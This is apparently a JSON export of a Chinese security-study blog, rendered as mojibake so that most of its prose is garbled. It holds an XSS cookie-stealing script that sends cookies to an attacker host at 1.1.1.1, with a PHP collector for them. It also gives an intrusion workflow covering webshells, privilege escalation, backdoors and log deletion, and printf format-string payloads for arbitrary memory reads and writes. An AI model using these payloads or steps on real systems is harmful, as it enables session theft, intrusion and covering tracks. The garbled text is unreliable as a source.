Scriptingï¼‰ï¼Œå››ç§ç±»å‹ï¼Œå¤§æ¦‚å¦‚ä¸‹\n\n1.åŸç†è§£æï¼š\n\n(1)é»‘å®¢é€šè¿‡æŸç½‘ç«™æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ°æŸç½‘ç«™ä¸­ï¼Œç”Ÿæˆç±»ä¼¼å›¾ç‰‡ï¼Œç•™è¨€ç­‰è¿›è¡Œä¼ªè£…ï¼Œå†…åœ¨æ˜¯æ”»å‡»é“¾æ¥ã€‚\n\n(2)ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™ï¼Œæ— æ„ä¸­ç‚¹å‡»äº†è¯¥å›¾ç‰‡ï¼Œç•™è¨€ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œäº†è¿™æ®µæ¶æ„ä»£ç ï¼Œè¿›å…¥äº†æ”»å‡»é“¾æ¥ï¼Œæ³„éœ²ä¿¡æ¯ã€‚\n\n2.ä¾‹å­ï¼š\n\n(1)åŸç½‘ç«™çš„HTMLï¼š\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xssæ”»å‡»</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\nç•™è¨€ï¼š<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='æäº¤'>\n</form>\n<br/>ç•™è¨€è®°å½•ï¼š<br/>\n```\n\nåç¼€æ”¹ä¸ºhtmlï¼Œæ‰“å¼€åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450943.png)\n\n(2)æ”»å‡»è€…é€šè¿‡æŸäº›æ‰‹æ®µä¿®æ”¹åå¦‚ä¸‹ï¼š\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xssæ”»å‡»</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\nç•™è¨€ï¼š<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='æäº¤'>\n</form>\n<br/>ç•™è¨€è®°å½•ï¼š<br/>\n\n<script>\nvar Str=document.cookie;                        //è·å–cookie\nvar a =document.createElement('a');             //åˆ›å»ºaæ ‡ç­¾\na.href='http://1.1.1.1/attack.php?'+Str;        //æ”»å‡»è€…ä¸»æœº\na.innerHTML=\"<img src='./aa.jpg'>\";             //æ©æŠ¤å›¾ç‰‡\ndocument.body.appendChild(a);                   //å°†æ ‡ç­¾æ·»åŠ åˆ°é¡µé¢ä¸­\n</script>\n</body>\n</html>\n```\n\næ‰“å¼€åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450848.png)\n\n(3)å½“ä¸å°å¿ƒç‚¹åˆ°è¯¥å›¾ç‰‡åï¼Œä¼šè·³è½¬åˆ°http://1.1.1.1/attack.php?Strè¿™ä¸ªURLç•Œé¢ï¼Œè·³å‡ºå¦‚ä¸‹ç•Œé¢ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450006.png)\n\nå…¶ä¸­arrayä¸­å°±æ˜¯è®¿é—®è¯¥ç½‘ç«™æ‰€å¾—åˆ°çš„cookieä»¤ç‰Œã€‚\n\næ”»å‡»è€…çš„attack.phpä»£ç å¦‚ä¸‹ï¼š\n\n```\n<?php\nheader(\"content-type:text/html;charset=utf8\");\necho \"ä½ çš„PHPSESSIDè¢«ç›—å•¦\";\necho \"<pre>\";\nprint_r($_GET);\necho \"</pre>\";\n$cookie=$_GET['PHPSESSID'];\nfile_put_contents('./xss.txt', $cookie);\n?>\n```\n\næ”»å‡»è€…å°†å¾—åˆ°çš„cookieå­˜å‚¨åˆ°ä»–æœåŠ¡å™¨1.1.1.1çš„xss.txtæ–‡ä»¶ä¸­ï¼Œä¹‹åæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨ä»ç”¨æˆ·è¿™å¾—åˆ°çš„cookieæ¥å‡è£…ç”¨æˆ·æˆåŠŸç™»å½•ç½‘ç«™ã€‚\n\n3.é˜²å¾¡æ‰‹æ®µï¼šè¿‡æ»¤è¾“å…¥ï¼Œæœ€æœ‰æ•ˆçš„ã€‚\n\n \n\nä¸‰ã€CSRFæ”»å‡»ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼‰\n\n1.åŸç†è§£æï¼š\n\n(1)ç”¨æˆ·Cæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®å—ä¿¡ä»»ç½‘ç«™Aï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚ç™»å½•ç½‘ç«™Aï¼›\n\n(2)åœ¨ç”¨æˆ·ä¿¡æ¯é€šè¿‡éªŒè¯åï¼Œç½‘ç«™Aäº§ç”ŸCookieä¿¡æ¯å¹¶è¿”å›ç»™æµè§ˆå™¨ï¼Œæ­¤æ—¶ç”¨æˆ·ç™»å½•ç½‘ç«™AæˆåŠŸï¼Œå¯ä»¥æ­£å¸¸å‘é€è¯·æ±‚åˆ°ç½‘ç«™Aï¼›\n\n(3)ç”¨æˆ·æœªé€€å‡ºç½‘ç«™Aä¹‹å‰ï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­ï¼Œæ‰“å¼€ä¸€ä¸ªTABé¡µè®¿é—®ç½‘ç«™Bï¼Œè¿™ä¸ªç½‘ç«™Bå°±æ˜¯é»‘å®¢ç”¨æ¥æ”»å‡»çš„è‡ªå·±æ­å»ºçš„ä¸€ä¸ªç½‘ç«™ï¼Œæˆ–è€…æ˜¯é»‘å®¢æ’å…¥æ”»å‡»ä»£ç çš„ç½‘ç«™ï¼›\n\n(4)è®¿é—®ç½‘ç«™Båï¼Œæ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚å(é»‘å®¢æ’å…¥çš„é“¾æ¥æˆ–è€…æ˜¯é»‘å®¢è‡ªå»ºçš„ç½‘ç«™ï¼Œå‰è€…éœ€è¦ç”¨æˆ·ç‚¹å‡»æ¶æ„ä»£ç é“¾æ¥ï¼Œç±»ä¼¼äºXSSæ”»å‡»ï¼Œåè€…åˆ™ä¸éœ€è¦)ï¼Œè¿”å›ä¸€äº›æ”»å‡»æ€§ä»£ç ï¼Œå¹¶å‘å‡ºä¸€ä¸ªè¯·æ±‚è¦æ±‚è®¿é—®ç¬¬ä¸‰æ–¹ç«™ç‚¹Aï¼›\n\n(5)æµè§ˆå™¨åœ¨æ¥æ”¶åˆ°è¿™äº›æ”»å‡»æ€§ä»£ç åï¼Œæ ¹æ®ç½‘ç«™Bçš„è¯·æ±‚ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æºå¸¦Cookieä¿¡æ¯ï¼Œå‘ç½‘ç«™Aå‘å‡ºè¯·æ±‚ã€‚ç½‘ç«™Aå¹¶ä¸çŸ¥é“è¯¥è¯·æ±‚å…¶å®æ˜¯ç”±Bå‘èµ·çš„ï¼Œæ‰€ä»¥ä¼šæ ¹æ®ç”¨æˆ·Cçš„Cookieä¿¡æ¯ä»¥Cçš„æƒé™å¤„ç†è¯¥è¯·æ±‚ï¼Œå¯¼è‡´æ¥è‡ªç½‘ç«™Bçš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚\n\nâ–²ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨æ¶æ„ç½‘ç«™ä½¿å¾—ç”¨æˆ·æµè§ˆå™¨æºå¸¦cookieå’Œæ¶æ„ä»£ç è¯·æ±‚æ¥ç™»å½•æ­£å¸¸ç½‘ç«™ï¼Œè¿™æ ·é»‘å®¢çš„æ¶æ„ä»£ç è¯·æ±‚å°±å¯ä»¥åœ¨è¯¥ç½‘ç«™è¢«æ‰§è¡Œï¼Œä»è€Œä½¿å¾—é»‘å®¢å¯ä»¥ä¼ªè£…æˆç”¨æˆ·æ¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œäº‹åçœ‹åˆ°çš„ä¹Ÿåªæ˜¯è¯¥ç”¨æˆ·çš„æ­£å¸¸è¯·æ±‚æ“ä½œï¼ŒåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ”»å‡»ç—•è¿¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450927.png)\n\n2.å®ä¾‹è§£æï¼š\n\nä¸æäº†ï¼ŒDVWAä¸Šå¾ˆå¤šã€‚\n\n \n\nå››ã€SSRFæ”»å‡»ï¼šServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ \n\n1.åŸç†è§£æï¼šæ¯”è¾ƒç®€å•ï¼Œå¸¸ç”¨æ¥å¤–ç½‘å°†æœåŠ¡å™¨å½“è·³æ¿æ¥æ¢æµ‹å†…ç½‘ã€‚\n\n(1)åˆ©ç”¨æœåŠ¡å™¨æä¾›çš„åŠŸèƒ½ï¼Œè¾“å…¥urlè·å–å›¾ç‰‡ï¼Œè¾“å…¥æŸipæŸ¥æ‰¾ä¿¡æ¯ç­‰ç­‰ã€‚\n\n(2)æ„é€ æˆ‘ä»¬éœ€è¦çš„urlï¼Œæˆ–è€…ä¸€äº›é“¾æ¥ï¼ŒæœåŠ¡æ¥è·å–æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„ä¿¡æ¯ã€‚\n\n2.å®ä¾‹è§£æï¼š\n\nä¸æäº†ï¼ŒDVWAä¸Šå¾ˆå¤šã€‚\n\nåé¢æœ‰æ—¶é—´å†æ€»ç»“ä¸‹å§ï¼Œå¾—æ»šå»è¡¥è½ä¸‹çš„ä¸œè¥¿äº†ã€‚\n\n \n\näº”ã€æ€»ç»“ä¸€ä¸‹å­¦åˆ°çš„æœ”æºï¼š\n\n1.é¦–å…ˆå¾—åˆ°ipï¼Œå…ˆæŒ‚clashå’Œproxifierå…¨å±€ä»£ç†å®‰æ’ä¸Šã€‚\n\n2.IPIP.net  ip138.comç­‰æŸ¥è¯¥ipä¸‹é¢ç»‘äº†å•¥åŸŸåï¼Œå¯¹åº”å¼€äº†ä»€ä¹ˆwebæœåŠ¡ã€‚\n\n3.å…ˆPingä¸€ä¸‹IPç»‘å®šçš„åŸŸåï¼Œçœ‹çœ‹æœ€ç»ˆçš„webæœåŠ¡æ˜¯ä¸æ˜¯æŒ‚åœ¨è¯¥IPä¸‹ã€‚ç„¶åæ‹¿ç›®å½•æ‰«æå™¨å¼€å§‹æ‰«è¿™ä¸ªipå¼€çš„webæœåŠ¡ï¼Œéœ€è¦å­—å…¸å’Œå·¥å…·ã€‚\n\n4.æ ¹æ®æ‰«æç»“æœæˆ–ç»éªŒï¼Œå°è¯•çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°åå°ç®¡ç†çš„ç™»å½•é¡µé¢ï¼Œå…ˆå°è¯•ä¸€æ³¢å¼±å£ä»¤ï¼ŒSQLæ³¨å…¥ä»€ä¹ˆçš„ã€‚\n\n5.ç°åœ¨å°±å¯ä»¥å°è¯•åˆ†æè¿™ä¸ªWebæœåŠ¡çš„CMSæ¶æ„ï¼Œæ‰¾å‡ºæ¥ä¹‹åå°±å¯ä»¥æ‰¾å¯¹åº”ç‰ˆæœ¬æ¼æ´æ‰“æ‰“è¯•è¯•ï¼Œå°è¯•æ‹¿Webshellã€‚\n\n6.ç»è¿‡è‰°è‹¦ä¸æ‡ˆçš„å°è¯•ï¼Œå†åŠ ä¸Šè¿æ°”ï¼Œå¯èƒ½å°±èƒ½æ‹¿Webshelläº†ã€‚è¿™æ—¶å€™è¿›å…¥ä»–çš„WebæœåŠ¡ä¸­ï¼Œå°è¯•ææƒä»€ä¹ˆçš„ï¼Œä¸€å¥è¯æœ¨é©¬ï¼Œå„ç§å°å·¥å…·å•¥çš„ä¸Šå°±å®Œäº†ã€‚\n\n7.æäº†ä¸€å †ä¹Ÿä¸å¤ªå¥½ä½¿çš„è¯ï¼Œé‚£å°±å¯èƒ½è¦è¢«å‘ç°äº†ï¼Œè¿™æ—¶å€™ä¸è¦æ…Œï¼Œèµ°ä¹‹å‰åˆ ä¸€åˆ WebæœåŠ¡ä¸Šæ— å…³ç´§è¦çš„å°å›¾ç‰‡ï¼Œå°é“¾æ¥ä»€ä¹ˆçš„ï¼Œç„¶åå°è¯•åˆ è®°å½•é€€å‡ºå•¥çš„ã€‚\n\n8.å“ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ‰“ä¸ªæ¸¸æˆï¼Œåƒä¸ªé¥­ï¼Œç¡ä¸ªè§‰ï¼Œç¬¬äºŒå¤©å†æ¥å°è¯•çœ‹çœ‹ï¼Œå¦‚æœè¿æ°”å¥½æ²¡è¢«å µä¸Šæ¼æ´ï¼Œé‚£å°±çœ‹çœ‹æ—¥å¿—ï¼Œè¿™å…„å¼Ÿçš„ä¸€äº›æ¢å¤æ“ä½œå°±èƒ½å®Œæ•´è¢«æˆ‘ä»¬çŸ¥é“ï¼Œç„¶åæ ¹æ®è¿™äº›æ—¥å¿—æ¥æ‰¾è´¦æˆ·å¯†ç ï¼Œæˆ–è€…æ˜¯ä¸€äº›ç³»ç»Ÿæ“ä½œè°ƒç”¨å•¥çš„ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ‹¿åˆ°æ›´é«˜çº§çš„æƒé™ã€‚\n\n9.è¿æ°”å†å¥½äº›æ‹¿åˆ°é«˜æƒé™çš„shellåï¼Œç§ä¸ªåé—¨æœ¨é©¬å°±è·‘è·¯å‘—ï¼Œè®°å¾—åˆ æ—¥å¿—ã€‚\n\n(åƒé‚£ç§æŒ‚äº†å¾ˆå¤šåŸŸåï¼Œæä¾›äº†çœ‹ä¼¼æ­£å¸¸çš„WebæœåŠ¡çš„ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯ä¸ªç”¨æ¥ç¿»å¢™æ´—ç™½æµé‡çš„æœåŠ¡å™¨ï¼Œè¿™ç§æœåŠ¡å™¨ä¸€èˆ¬æ¯”è¾ƒå¥½æ‹¿æƒé™ï¼Œå› ä¸ºä½¿ç”¨è€…ä¸€èˆ¬æŒ‚å®ŒæœåŠ¡åéƒ½ä¸ä¼šå†æŠ•å…¥è¿‡å¤šç²¾åŠ›å»ç®¡çš„)\n\nâ–²CMSå•¥çš„å¸¸è§„ä¸ç®¡ç”¨ï¼Œå°±æ‰«ç«¯å£ï¼Œå°è¯•ç«¯å£æœåŠ¡æ¼æ´ç›´æ¥çˆ†ç ´ï¼Œå†ç‰›é€¼ç‚¹ï¼Œä½¿ç”¨0dayæ‰“ã€‚å†å†ç‰›é€¼ç‚¹ï¼Œç›´æ¥ç°åœºæŒ–å¯¹åº”ç‰ˆæœ¬æœåŠ¡çš„æ¼æ´(pwnå¤§ä½¬å¹²çš„æ´»)ã€‚\n\n \n\nâ–²å†è¡¥ä¸€ä¸‹æŠ¤ç½‘å¯¹USGå†™çš„è„šæœ¬ï¼Œæ˜¯åŒå­¦å†™çš„ï¼Œç‰ˆæƒåœ¨ä»–é‚£é‡Œï¼Œç‰¹æ­¤å£°æ˜ã€‚æœ¬æ¥è‡ªå·±æƒ³å†™å¦ä¸€ä¸ªè§£æHTMLçš„è„šæœ¬å´æ€ä¹ˆä¹Ÿä¸æˆåŠŸï¼Œæ°´å¹³è¿˜æ˜¯å¤ªå·®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nimport json\nimport winsound\nimport requests\nimport time\n\nrequests.packages.urllib3.disable_warnings()\n\nurl = \"https://10.10.10.1/=========================\"\n\nheaders = {\n    \"Accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\",\n    \"Cache-Control\": \"max-age=0\",\n    \"Connection\": \"keep-alive\",\n    \"Cookie\": \"=======================================\",\n    \"Host\": \"10.10.10.1\",\n    \"Sec-Fetch-Dest\": \"document\",\n    \"Sec-Fetch-Mode\": \"navigate\",\n    \"Sec-Fetch-Site\": \"none\",\n    \"Sec-Fetch-User\": \"?1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"========================================\",\n}\n\nrecorded_ips = set()\n\nwith open(\"blacklistips.txt\", \"r\") as f:\n    recorded_ips = set(f.read().splitlines())\n\nwhile True:\n\n    try:\n        print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(time.time())))\n\n        doc = requests.get(url=url, headers=headers, verify=False)\n\n        if doc.status_code != 200:\n            winsound.Beep(2000, 2000)\n            print(\"æ— æ³•è®¿é—®\")\n            time.sleep(10)\n            continue\n\n        json_dict = json.loads(doc.text)\n        data = json_dict[\"data\"]\n        for attack in data:\n            ip = attack[\"name\"]\n            hasRisk = (\n                int(attack[\"middle\"]) > 0\n                or int(attack[\"high\"]) > 0\n                or int(attack[\"critical\"]) > 0\n            )\n\n            if not hasRisk:\n                continue\n\n            if ip in recorded_ips:\n                continue\n\n            print(attack)\n            winsound.Beep(2000, 2000)\n            recorded_ips.add(ip)\n\n        with open(\"blacklistips.txt\", \"w\") as f:\n            for data in recorded_ips:\n                f.write(data + \"\\n\")\n        print(\"å¹³å¹³å®‰å®‰\")\n        time.sleep(30)\n\n    except Exception as err:\n        print(err)\n        winsound.Beep(2000, 2000)\n        time.sleep(10)\n```\n\n \n\nâ–²æœ€ååšä¸ªæ€»ç»“ï¼Œå­¦äº†è¿™äº›å¤©ä¸‹æ¥ï¼Œæ„Ÿè§‰Webå¤ªæ‚å¤ªä¹±ï¼Œè¾¹è¾¹è§’è§’å¤ªå¤šï¼Œè€Œä¸”æ›´æ–°é€Ÿåº¦æå¿«ï¼Œå¯èƒ½è¿‡ä¸ªä¸€ä¸¤ä¸ªæœˆå°±è¿‡æ—¶çš„ï¼Œå®åœ¨æ˜¯ä¸é€‚åˆåƒæˆ‘è¿™ç§åˆè ¢åˆæ‡’ï¼Œè„‘å®¹é‡åˆå°çš„èœé¸¡å»æã€‚\n\nè¿˜æ˜¯æ„Ÿè§‰ç°åœ¨æ·±å…¥æWebä¸åˆ°æ—¶å€™ï¼Œåœ¨æ ¡æœŸé—´æ›´é€‚åˆå­¦äº›åŸºç¡€ç†è®ºçš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¹‹åè¿˜æ˜¯å›è€æœ¬è¡ŒæäºŒè¿›åˆ¶å»å§ï¼Œèµ·ç è¿™äº›ç†è®ºçŸ¥è¯†æ›´æ–°æ¢ä»£æ¯”è¾ƒæ…¢ä¸€ç‚¹ã€‚å¹¶ä¸”è¿™ç§æ›´æ–°æ›´åƒæ˜¯ä¸€ç§åŸºäºç†è®ºæ¥åƒå˜ä¸‡åŒ–çš„ï¼Œè€Œä¸åƒWebå¥½å¤šéƒ½æ˜¯é‚£ç§ä¸€æ›´æ–°å°±å®Œå…¨å˜æˆæ–°ä¸œè¥¿ï¼Œæ²¡å¤šå°‘ç†è®ºä¾æ®å¯è¨€ï¼Œç›´æ¥å°±æ˜¯å¼€è„‘æ´çš„ã€‚\n\nè¿˜æ˜¯æäºŒè¿›åˆ¶å»å§ï¼Œé»‘å®¢çš„ç†æƒ³è¿˜æ˜¯ç­‰ä»¥åå·¥ä½œäº†å†æ¥ã€‚\n","tags":["WEB"],"categories":["WEB"]},{"title":"æ ¼å¼åŒ–å­—ç¬¦printfæ±‡æ€»","url":"/2021/08/14/æ ¼å¼åŒ–å­—ç¬¦printfæ±‡æ€»/","content":"\nâ–²printfçš„æ€§è´¨ï¼š\n\nâ–²å‚æ•°%sï¼šè¿™ä¸ªå‚æ•°å…¶æœ¬è´¨ä¸Šæ˜¯è¯»å–å¯¹åº”çš„å‚æ•°ï¼Œå¹¶ä½œä¸ºæŒ‡é’ˆè§£æï¼Œè·å–åˆ°å¯¹åº”åœ°å€çš„å­—ç¬¦ä¸²è¾“å‡ºã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªæ€§è´¨æ¥æ³„éœ²æŸä¸ªå†…å­˜åœ°å€çš„å†…å®¹ï¼š\n\nä¾‹å­ï¼š\n\nå¦‚æœè¾“å…¥ä¸€ä¸ª%Sï¼Œåœ¨è°ƒç”¨printfä¹‹å‰ï¼Œæ ˆä¸Šä¼šæ˜¯è¿™ç§æ•°æ®ï¼Œæœ‰ä¸¤ä¸ªç›¸åŒçš„æŒ‡å‘%Sï¼Œä¸€ä¸ªæ˜¯ä¼šè§£ææˆå‚æ•°%Sï¼Œä¸€ä¸ªä¼šä½¿ç”¨è§£æçš„å‚æ•°%Sä½œç”¨æ¥æ‰“å°è¾“å…¥çš„%Sã€‚è¿™é‡Œå¯ä»¥è®¡ç®—å‡ºåç§»é‡ä¸º6ï¼Œå³ä»æ ˆé¡¶æ•°ç¬¬6ä¸ªå¯ä»¥åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„å†…å®¹0x0a7325ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191542914.png)\n\n \n\n1.æ³„éœ²ä»»æ„åœ°å€å†…å®¹\n\n```\n#æ³¨é‡Šå¤´\n\n\\x01\\x80\\x04\\x08%x.%x.%x.%x.%s\n```\n\nè¿™ä¸€æ®µå³æ‰“å°ä»æ ˆé¡¶å¾€ä¸‹æ•°5ä¸ªå†…å®¹çš„æ ˆä¸­ä¿å­˜çš„å€¼ï¼Œç”±äºç¬¬5ä¸ªå‚æ•°æ˜¯%sï¼Œæ‰€ä»¥ä¼šå°†ç¬¬5ä¸ªå†…å®¹å½“ä½œä¸€ä¸ªåœ°å€æ¥è§£æï¼Œä»è€Œæ‰“å°ä½äºè¯¥åœ°å€ä¸Šçš„å€¼ã€‚æ‰€ä»¥è¾“å‡ºåº”è¯¥ä¸º0xff95abb4,0x0000012B,0x08048465.....(è¿™éƒ½æ˜¯æ ˆä¸Šçš„å†…å­˜),æœ€åç¬¬äº”ä¸ªå†…å®¹æ˜¯0x08040801ï¼Œç”¨å‚æ•°%sæ¥è§£æï¼Œå³æ‰“å°è¯¥åœ°å€ä¸Šä¿å­˜çš„å†…å®¹ï¼Œåœ°å€å¯¹åº”çš„å€¼ä¸ºâ€ELF\\x01\\x01\\x01\\nâ€ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“å°ä»»æ„å†…å­˜åœ°å€çš„å€¼ã€‚å¸¸ç”¨æ¥ä¼ å…¥gotè¡¨åœ°å€ï¼Œç„¶åå€ŸåŠ©è¯¥å‡½æ•°æ³„éœ²æŸå‡½æ•°gotè¡¨ä¸­çš„å€¼ï¼Œå³æ˜¯æ³„éœ²è¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚\n\nâ–²ç®€åŒ–ä½¿ç”¨ï¼š\n\nå¦‚æœè¾“å…¥çš„å‚æ•°ä¿å­˜åœ¨æ ˆä¸Šå¾ˆè¿œçš„ä½ç½®ï¼Œé‚£ä¹ˆåˆ™éœ€è¦å åŠ %xï¼Œä½†æ˜¯å®é™…ä¸­å¯ä»¥ä½¿ç”¨ç®€å•çš„åç§»æ¥æ‰“å°ï¼š\\x01\\x80\\x04\\x08%5$sï¼Œå…¶ä¸­5å°±ä»£è¡¨ä»espå¼€å§‹è®¡ç®—åç§»é‡ä¸º6ã€‚\n\næ€»çš„æ¥è¯´å°±æ˜¯ä¸€ä¸ªå…¬å¼ï¼Œè¾“å‡ºåç§»é‡ä¸ºnçš„å‚æ•°çš„å€¼å°±æ˜¯ï¼š\n\n%(n-1)$s\n\n(%[addr_offset_value]$[æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦])\n\n \n\n2.ä»»æ„åœ°å€å¯å†™ï¼š\n\nç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦%nå®¶æ—ï¼š\n\n(1)è¿™ä¸ªå­—ç¬¦ä¼šå°†å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å†™å…¥åˆ°æŒ‡å®šå†…å­˜ä¸­ï¼Œä¾‹å¦‚\\x8c\\x97\\x04\\x08%[addr_offset_value]$nï¼Œè¿™æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼šä½¿å¾—åœ°å€0x0804978cå¤„çš„å†…å®¹å˜æˆ4ï¼Œå› ä¸ºè¿™ä»£è¡¨äº†è¾“å‡ºäº†\\x8c\\x97\\x04\\x08è¿™å››ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¼šå‘0x0804978cè¿™ä¸ªåœ°å€å†™å…¥4ï¼Œå®é™…æ˜¯å†™å…¥00 00 00 04ï¼Œå…±è®¡å››ä¸ªå­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥ä¿®æ”¹æŸä¸ªåœ°å€çš„å€¼ã€‚\n\n(2)\\x8c\\x97\\x04\\x08%2048c%(addr_offset_value)$nï¼šè¿™ä¸ªä»£ç ä¼šå°†2052ï¼Œå®é™…æ˜¯(00 00 08 04) ï¼Œå…±è®¡å››ä¸ªå­—èŠ‚å†™å…¥åˆ°åœ°å€0x0804978cï¼Œå› ä¸ºè°ƒç”¨äº†printfä¼šå…ˆæ‰“å°\\x8c\\x97\\x04\\x08å››ä¸ªå­—ç¬¦ï¼Œç„¶åä¾æ®æ ¼å¼åŒ–å­—ç¬¦%2048cï¼Œå†æ‰“å°2048ä¸ªç©ºå­—ç¬¦ï¼Œå®é™…æ‰“å°äº†2048+4=2052ä¸ªå­—ç¬¦ï¼Œå¯¹åº”16è¿›åˆ¶ä¸º0x804ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ˜¯éœ€è¦å‡å»åœ¨%è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ ‡å¿—å‰çš„å­—ç¬¦çš„ä¸ªæ•°æ‰æ˜¯å¯¹åº”çš„å€¼ã€‚\n\n(3)ä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å°†ä¸€ä¸ªåœ°å€çš„å€¼å†™å…¥åˆ°æŸä¸ªåœ°å€ï¼Œä½¿å¾—å¯ä»¥è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¾“å…¥çš„å°±ä¼šå˜æˆ0x8xxx....è½¬æ¢æˆåè¿›åˆ¶åˆ™ä¼šç‰¹åˆ«å¤§ï¼Œä¼šå‘æœåŠ¡å™¨å‘é€0x8000...ä¸ªå­—ç¬¦ï¼Œè¿™åœ¨å®é™…ä¸­å¾ˆå®¹æ˜“å‡ºé”™ã€‚è¿™æ—¶å€™éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ§åˆ¶ï¼š%hhnã€‚\n\n(4)ç‰¹æ®Šæ ¼å¼åŒ–å­—ç¬¦%hhnï¼šè¿™ä¸ªå­—ç¬¦å¯ä»¥ä½¿å¾—ä¸€æ¬¡å¾€æŒ‡å®šåœ°å€å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬éœ€è¦è¾“å…¥çš„åœ°å€ç»™æ‹†åˆ†æˆ4ä¸ªå­—èŠ‚æ¥è¾“å…¥ã€‚\n\n(5)ä¾‹å¦‚\n\n\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08%16c%5$hhn%99c%6$hhn%129c%7$hhn%4c%8$hhn\n\nè¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å½“äºå››ä¸ªæ“ä½œï¼š\n\nâ‘ \\x78\\x97\\x04\\x08%16c%5$hhnï¼šæ”¹å˜åœ°å€0x08049778çš„å€¼ä¸º0x20ã€‚\n\nè¿™é‡Œæ˜¯20æ˜¯å› ä¸ºå‰é¢å·²ç»è¾“å‡ºäº†\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08æ€»å…±16ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å®é™…å†™å…¥åˆ°åœ°å€0x08049778çš„å€¼ä¸º16+16=32=0x20ã€‚\n\nâ‘¡\\x79\\x97\\x04\\x08%99c%6$hhn:æ”¹å˜åœ°å€0x08049779çš„å€¼ä¸º99+32=131=0x83ï¼ŒåŒç†ï¼Œå› ä¸ºå‰é¢å·²ç»è¾“å‡ºäº†32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€ç»ˆå†™å…¥å€¼ä¸º0x83ã€‚\n\nâ‘¢\\x7a\\x97\\x04\\x08%129c%7$hhnï¼šæ”¹å˜åœ°å€0x0804977açš„å€¼ä¸º129+131=260=0x104ï¼Œè¿™é‡Œç”±äºæ˜¯ä½¿ç”¨%hhnï¼Œæ‰€ä»¥åªèƒ½å†™å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ä¼šè¢«æˆªæ–­ä¸º0x04\n\nâ‘£\\x7b\\x97\\x04\\x08%4c%8$hhnï¼šæ”¹å˜åœ°å€0x0804977bçš„å€¼ä¸º4+0x104=0x108=0x08ã€‚æ‰€ä»¥æœ€ç»ˆå†™å…¥åˆ°åœ°å€0x08049778ä¸­çš„å››ä¸ªå­—èŠ‚ä¸º0x08048320ï¼Œå®Œæˆå†™å…¥åœ°å€ã€‚\n\næ€»çš„å…¬å¼:\n\n[addr]%[padding_count]c%[addr_offset_value]$[æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦]\n\nâ–²æ³¨æ„åç§»é‡ä¸€ç›´åœ¨é€’å¢ã€‚è¿˜æœ‰å°±æ˜¯å› 